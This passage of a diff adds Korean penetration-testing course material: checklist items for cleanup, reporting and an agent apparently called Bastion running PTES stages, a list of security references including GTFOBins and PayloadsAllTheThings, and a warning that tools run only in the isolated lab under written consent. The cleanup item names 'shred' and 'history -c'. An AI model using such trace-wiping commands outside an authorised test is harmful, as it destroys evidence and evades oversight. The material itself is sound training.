+- [ ] s14: shred + history -c + 모든 임시 파일 제거, cleanup-log.txt
+- [ ] s15: Executive Summary 5 섹션 (Overall/Findings/ATT&CK/Recommendations/Cleanup)
+- [ ] s99: Bastion 가 PTES 1-5단계 5 작업을 순차 실행, ATT&CK 5개 매핑
+
+### 추가 참조 자료
+
+- **PTES Standard** http://www.pentest-standard.org/
+- **OWASP WSTG v4.2** Web Security Testing Guide
+- **NIST SP 800-115** Technical Guide to InfoSec Testing and Assessment
+- **OSSTMM v3** Open Source Security Testing Methodology Manual
+- **MITRE ATT&CK Enterprise Matrix v14**
+- **OWASP ZAP** https://www.zaproxy.org/
+- **GTFOBins** https://gtfobins.github.io/
+- **HackTricks** https://book.hacktricks.xyz/ (post-ex cheatsheet)
+- **PayloadsAllTheThings** https://github.com/swisskyrepo/PayloadsAllTheThings
+- **OSCP Style Reports** https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
+- **CVSS v3.1 Specification** https://www.first.org/cvss/v3.1/specification-document
+
+위 모든 도구는 `10.20.30.0/24` (CCC 격리 lab) 또는 학생 본인의 격리 VM 에서만 사용한다.
+실제 외부 시스템에 nmap / nuclei / sqlmap 을 돌리면 (a) 컴퓨터통신망법 위반 (b) 침해 사고
+신고 (c) 학교·회사 보안팀 조사 — 반드시 사전 서면 동의 (RoE) 가 있는 환경에서만.
+모의해킹 직후 cleanup 단계 (s14) 를 절대 건너뛰지 않는다 — 임시 도구·자격증명·webshell 잔존
+시 다른 공격자가 이용 가능.
